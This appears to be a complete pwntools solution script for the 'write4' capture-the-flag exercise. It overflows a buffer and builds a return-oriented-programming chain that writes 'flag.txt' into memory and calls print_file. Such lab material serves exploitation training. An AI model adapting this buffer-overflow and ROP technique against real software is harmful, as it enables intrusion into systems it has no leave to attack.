from pwn import *
p = process("./write4")
elf = ELF("./write4")
location = p64(0x00601028)

mov_r14_r15 = p64(0x00400628)
pop_r14_r15 = p64(0x00400690)
pop_rdi = p64(0x00400693)

payload  = b"A" * 40
payload += pop_r14_r15                         # pop r14; pop r15; ret;
payload += location                            # Address where the string will be written to
payload += b"flag.txt"                         # The string
payload += mov_r14_r15                         # mov QWORD PTR [r14],r15; ret;
payload += pop_rdi                             # pop rdi; ret;
payload += location                            # Address of where the string is saved to
payload += p64(elf.symbols['print_file'])  
 
p.recvuntil("> ")
p.sendline(payload)
p.interactive()

